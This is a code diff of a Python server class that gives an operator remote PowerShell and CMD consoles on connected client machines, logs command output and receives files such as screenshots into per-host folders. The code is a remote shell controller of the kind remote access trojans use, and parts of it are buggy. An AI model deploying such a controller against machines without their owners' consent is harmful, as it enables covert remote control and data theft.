@@ -10,10 +10,9 @@ from datetime import datetime
 
 
 class Freestyle:
-    def __init__(self, con, root, tmp_availables, clients, targets, logpath, ipval, host, user):
-        self.ipval = ipval
-        self.host = host
-        self.user = user
+    threads = []
+
+    def __init__(self, con, root, tmp_availables, clients, targets, logpath):
         self.con = con
         self.root = root
         self.tmp_availables = tmp_availables
@@ -35,71 +34,304 @@ class Freestyle:
 
         return
 
-    def make_dir(self, ip):
-        self.logIt_thread(self.log_path, debug=False, msg=f'Running make_dir()...')
-        self.logIt_thread(self.log_path, debug=False, msg=f'Creating Directory...')
+    def recv_file(self, text):
+        def make_dir():
+            self.logIt_thread(self.log_path, debug=False, msg=f'Running make_dir()...')
+            self.logIt_thread(self.log_path, debug=False, msg=f'Creating Directory...')
+            # Create a directory with host's name if not already exists.
+            for item in self.tmp_availables:
+                for conKey, ipValue in self.clients.items():
+                    for ipKey in ipValue.keys():
+                        if item[1] == ipKey:
+                            ipval = item[1]
+                            host = item[2]
+                            user = item[3]
+                            path = os.path.join(self.root, host)
+                            try:
+                                os.makedirs(path)
 
-        for conKey, ipValue in self.clients.items():
-            for ipKey, userValue in ipValue.items():
-                if ipKey == ip:
-                    for item in self.tmp_availables:
-                        if item[1] == ip:
-                            for identKey, timeValue in userValue.items():
-                                name = item[2]
-                                loggedUser = item[3]
-                                clientVersion = item[4]
-                                path = os.path.join(self.root, name)
+                            except FileExistsError:
+                                self.logIt_thread(self.log_path, debug=False, msg=f'Passing FileExistsError...')
+                                pass
 
-                                try:
-                                    os.makedirs(path)
+                            self.logIt_thread(self.log_path, debug=False, msg=f'Directory created.')
 
-                                except FileExistsError:
-                                    self.logIt_thread(self.log_path, debug=False, msg=f'Passing FileExistsError...')
-                                    pass
+                            return ipval, host, user, path
 
-        return name, loggedUser, path
-
-    def freestyle(self, ip):
-        name, loggedUser, path = self.make_dir(ip)
-        self.cmd_log = rf'C:\Peach\{name}\cmd_log.txt'
-
-        while True:
+        def file_name():
+            self.logIt_thread(self.log_path, debug=False, msg=f'Running file_name()...')
             try:
-                self.logIt_thread(self.log_path, debug=False, msg=f'Waiting for user input...')
-                cmd = input(f"{ip}|{name}♦CMD>")
-                self.logIt_thread(self.log_path, debug=False, msg=f'User input: {cmd}')
+                self.logIt_thread(self.log_path, debug=False, msg=f'Waiting for filename from client...')
+                filename = self.con.recv(1024)
+                self.logIt_thread(self.log_path, debug=False, msg=f'File name: {filename}')
 
-                if str(cmd).lower()[:4] == "back":
-                    self.logIt_thread(self.log_path, debug=False, msg=f'Sending {cmd} command to client...')
-                    self.con.send("back".encode())
-                    self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')
-                    break
-
-                self.logIt_thread(self.log_path, debug=False, msg=f'Sending {cmd} to client...')
-                self.con.send(cmd.encode())
+                self.logIt_thread(self.log_path, debug=False, msg=f'Sending confirmation to client...')
+                self.con.send("Filename OK".encode())
                 self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')
 
-                while True:
-                    result = self.con.recv(1024).decode()
-
-                    if "END" in str(result):
-                        break
-
-                    print(result)
-
-                    if not os.path.exists(self.cmd_log):
-                        with open(self.cmd_log, 'w+') as log:
-                            log.write(f"Command: {cmd}\n")
-                            log.write(f"{result}\n")
-
-                    else:
-                        with open(self.cmd_log, 'a') as log:
-                            log.write(f"Command: {cmd}\n")
-                            log.write(f"{result}\n")
+                return filename
 
             except (WindowsError, socket.error) as e:
                 self.logIt_thread(self.log_path, debug=True, msg=f'Error: {e}')
                 return False
+
+        def fetch(filename):
+            self.logIt_thread(self.log_path, debug=False, msg=f'Running fetch()...')
+            try:
+                self.logIt_thread(self.log_path, debug=False, msg=f'Waiting for file size...')
+                size = self.con.recv(4)
+                self.logIt_thread(self.log_path, debug=False, msg=f'File size: {size}')
+
+                self.logIt_thread(self.log_path, debug=False, msg=f'Converting size bytes to numbers...')
+                size = self.bytes_to_number(size)
+                self.logIt_thread(self.log_path, debug=False, msg=f'Converting completed.')
+
+                current_size = 0
+                buffer = b""
+                try:
+                    if os.path.exists(filename):
+                        for i in range(5):
+                            filename = f"{filename[:-4]}[i].txt"
+
+                    self.logIt_thread(self.log_path, debug=False, msg=f'Opening file: {filename} for writing...')
+                    with open(filename, 'wb') as file:
+                        self.logIt_thread(self.log_path, debug=False, msg=f'Fetching file content...')
+                        while current_size < size:
+                            data = self.con.recv(1024)
+                            if not data:
+                                break
+
+                            if len(data) + current_size > size:
+                                data = data[:size - current_size]
+
+                            buffer += data
+                            current_size += len(data)
+                            file.write(data)
+
+                    self.logIt_thread(self.log_path, debug=False, msg=f'Fetch completed.')
+
+                except FileExistsError:
+                    self.logIt_thread(self.log_path, debug=False, msg=f'File Exists error.')
+                    self.logIt_thread(self.log_path, debug=False, msg=f'Opening {filename} for appends...')
+                    with open(filename, 'ab') as file:
+                        while current_size < size:
+                            self.logIt_thread(self.log_path, debug=False, msg=f'Fetching file content...')
+                            data = self.con.recv(1024)
+                            if not data:
+                                break
+
+                            if len(data) + current_size > size:
+                                data = data[:size - current_size]
+
+                            buffer += data
+                            current_size += len(data)
+                            file.write(data)
+
+                    self.logIt_thread(self.log_path, debug=False, msg=f'Fetch completed.')
+
+            except (WindowsError, socket.error) as e:
+                self.logIt_thread(self.log_path, debug=True, msg=f'Error: {e}')
+                return False
+
+        def output():
+            self.logIt_thread(self.log_path, debug=False, msg=f'Running output()...')
+            self.logIt_thread(self.log_path, debug=False, msg=f'Opening {filename} for reading...')
+            with open(filename, 'r') as file:
+                self.logIt_thread(self.log_path, debug=False, msg=f'Reading file content...')
+                data = file.read()
+                self.logIt_thread(self.log_path, debug=False, msg=f'Printing file content...')
+                print(data)
+                self.logIt_thread(self.log_path, debug=False, msg=f'Print completed.')
+
+        def confirm():
+            self.logIt_thread(self.log_path, debug=False, msg=f'Running confirm()...')
+            try:
+                self.logIt_thread(self.log_path, debug=False, msg=f'Sending OK message to client...')
+                self.con.send("OK".encode())
+                self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')
+
+                self.logIt_thread(self.log_path, debug=False, msg=f'Waiting for answer from client...')
+                ans = self.con.recv(1024).decode()
+                self.logIt_thread(self.log_path, debug=False, msg=f'Client answer: {ans}')
+
+                self.logIt_thread(self.log_path, debug=False, msg=f'Printing confirmation to screen...')
+                print(f"[{colored('V', 'green')}]{ans}")
+
+            except (WindowsError, socket.error) as e:
+                self.logIt_thread(self.log_path, debug=False, msg=f'Error: {e}')
+                return False
+
+        def move(filename, path):
+            self.logIt_thread(self.log_path, debug=False, msg=f'Running move({filename}, {path})...')
+            # Move screenshot file to directory
+            self.logIt_thread(self.log_path, debug=False, msg=f'Renaming {filename}...')
+            filename = str(filename).strip("b'")
+            self.logIt_thread(self.log_path, debug=False, msg=f'New filename: {filename}')
+
+            self.logIt_thread(self.log_path, debug=False, msg=f'Capturing {filename} absolute path...')
+            src = os.path.abspath(filename)
+            self.logIt_thread(self.log_path, debug=False, msg=f'Abs path: {src}')
+
+            self.logIt_thread(self.log_path, debug=False, msg=f'Defining destination...')
+            dst = fr"{path}"
+            self.logIt_thread(self.log_path, debug=False, msg=f'Destination: {dst}.')
+
+            self.logIt_thread(self.log_path, debug=False, msg=f'Moving file...')
+            shutil.move(src, dst)
+            self.logIt_thread(self.log_path, debug=False, msg=f'File {filename} moved to {dst}.')
+
+        self.logIt_thread(self.log_path, debug=False, msg=f'Running recv_file()...')
+        self.logIt_thread(self.log_path, debug=False, msg=f'Calling make_dir()...')
+        ipval, host, user, path = make_dir()
+
+        self.logIt_thread(self.log_path, debug=False, msg=f'Defining filename...')
+        filename = file_name()
+        self.logIt_thread(self.log_path, debug=False, msg=f'File name: {filename}.')
+
+        self.logIt_thread(self.log_path, debug=False, msg=f'Calling fetch({filename})...')
+        fetch(filename)
+
+        self.logIt_thread(self.log_path, debug=False, msg=f'Performing print validation...')
+        if text:
+            output()
+
+        self.logIt_thread(self.log_path, debug=False, msg=f'Calling confirm()...')
+        confirm()
+
+        self.logIt_thread(self.log_path, debug=False, msg=f'Calling move({filename}, {path})')
+        move(filename, path)
+
+        self.logIt_thread(self.log_path, debug=False, msg=f'=== End of self.recv() ===')
+
+    def freestyle(self):
+        def validate():
+            while True:
+                self.logIt_thread(self.log_path, debug=False, msg=f'Calling self.freestyle_menu()...')
+                self.freestyle_menu()
+
+                try:
+                    self.logIt_thread(self.log_path, debug=False, msg=f'Waiting for user input...')
+                    choice = int(input("#>"))
+                    self.logIt_thread(self.log_path, debug=False, msg=f'User input: {choice}')
+
+                    if choice > 2:
+                        self.logIt_thread(self.log_path, debug=False, msg=f'Wrong input detected.')
+                        print(f"[{colored('*', 'red')}]Wrong Number. "
+                              f"[{colored('1', 'yellow')} - {colored('2', 'yellow')} or {colored('0', 'yellow')}]\n")
+
+                    return choice
+
+                except ValueError:
+                    self.logIt_thread(self.log_path, debug=False, msg=f'Wrong value detected.')
+                    print(
+                        f"[{colored('*', 'red')}]Numbers only. Choose between "
+                        f"[{colored('1', 'yellow')} - {colored('3', 'yellow')} or {colored('0', 'yellow')}].\n")
+
+                    continue
+
+        choice = validate()
+
+        # Run Powershell Command
+        if int(choice) == 1:
+            try:
+                self.logIt_thread(self.log_path, debug=False, msg=f'Sending ps command to client...')
+                self.con.send("ps".encode())
+                self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')
+
+                while True:
+                    self.logIt_thread(self.log_path, debug=False, msg=f'Waiting for user input...')
+                    cmd = input("PS>")
+                    self.logIt_thread(self.log_path, debug=False, msg=f'User input: {cmd}')
+
+                    if str(cmd).lower()[:4] == "back":
+                        self.logIt_thread(self.log_path, debug=False, msg=f'Sending {cmd} command to client...')
+                        self.con.send("back".encode())
+                        self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')
+
+                        self.con.recv(1024).decode()
+                        break
+
+                    self.logIt_thread(self.log_path, debug=False, msg=f'Sending {cmd} to client...')
+                    self.con.send(cmd.encode())
+                    self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')
+
+                    self.logIt_thread(self.log_path, debug=False, msg=f'Sleeping for 1 second...')
+                    time.sleep(1)
+
+                    # Create Command log file
+                    command_log_file = rf'C:\Peach\commands.txt'
+                    res = []
+
+                    while True:
+                        line = self.con.recv(1024).decode()
+
+                        if "END" in str(line):
+                            break
+
+                        print(line)
+                        res.append(line)
+
+                    if os.path.exists(command_log_file):
+                        with open(command_log_file, 'a') as file:
+                            for line in res:
+                                file.write(f"\n{str(line)}\n")
+
+                    else:
+                        with open(command_log_file, 'w') as file:
+                            for line in res:
+                                file.write(f"\n{str(line)}\n")
+
+                    # self.logIt_thread(self.log_path, debug=False, msg=f'Calling self.recv_file(text=True)...')
+                    # self.recv_file(text=True)
+
+            except (WindowsError, socket.error) as e:
+                self.logIt_thread(self.log_path, debug=True, msg=f'Error: {e}')
+                return False
+
+        # Run CMD Command
+        elif int(choice) == 2:
+            try:
+                self.logIt_thread(self.log_path, debug=False, msg=f'Sending cmd command to client...')
+                self.con.send("cmd".encode())
+                self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')
+
+                while True:
+                    self.logIt_thread(self.log_path, debug=False, msg=f'Waiting for user input...')
+                    cmd = input("CMD>")
+                    self.logIt_thread(self.log_path, debug=False, msg=f'User input: {cmd}.')
+
+                    if str(cmd).lower()[:4] == "back":
+                        self.logIt_thread(self.log_path, debug=False, msg=f'Sending {cmd} command to client...')
+                        self.con.send("back".encode())
+                        self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')
+
+                        self.con.recv(1024).decode()
+                        break
+
+                    self.logIt_thread(self.log_path, debug=False, msg=f'Sending {cmd} to client...')
+                    self.con.send(cmd.encode())
+                    self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')
+
+                    self.logIt_thread(self.log_path, debug=False, msg=f'Sleeping for 1 second...')
+                    time.sleep(1)
+
+                    self.logIt_thread(self.log_path, debug=False, msg=f'Calling self.recv_file(text=True)...')
+                    # self.recv_file(text=True)
+
+            except (WindowsError, socket.error) as e:
+                self.logIt_thread(self.log_path, debug=True, msg=f'Error: {e}.')
+                return False
+
+        elif int(choice) == 0:
+            self.logIt_thread(self.log_path, debug=False, msg=f'Sending back command to client...')
+            self.con.send("back".encode())
+            self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')
+
+            self.logIt_thread(self.log_path, debug=False, msg=f'Waiting for response from client...')
+            ans = self.con.recv(1024).decode()
+            self.logIt_thread(self.log_path, debug=False, msg=f'Client response: {ans}.')
+
+            return
 
     def get_date(self):
         d = datetime.now().replace(microsecond=0)
@@ -132,4 +364,5 @@ class Freestyle:
     def logIt_thread(self, log_path=None, debug=True, msg=''):
         self.logit_thread = Thread(target=self.logIt, args=(log_path, debug, msg), name="Log Thread")
         self.logit_thread.start()
+        self.threads.append(self.logit_thread)
         return
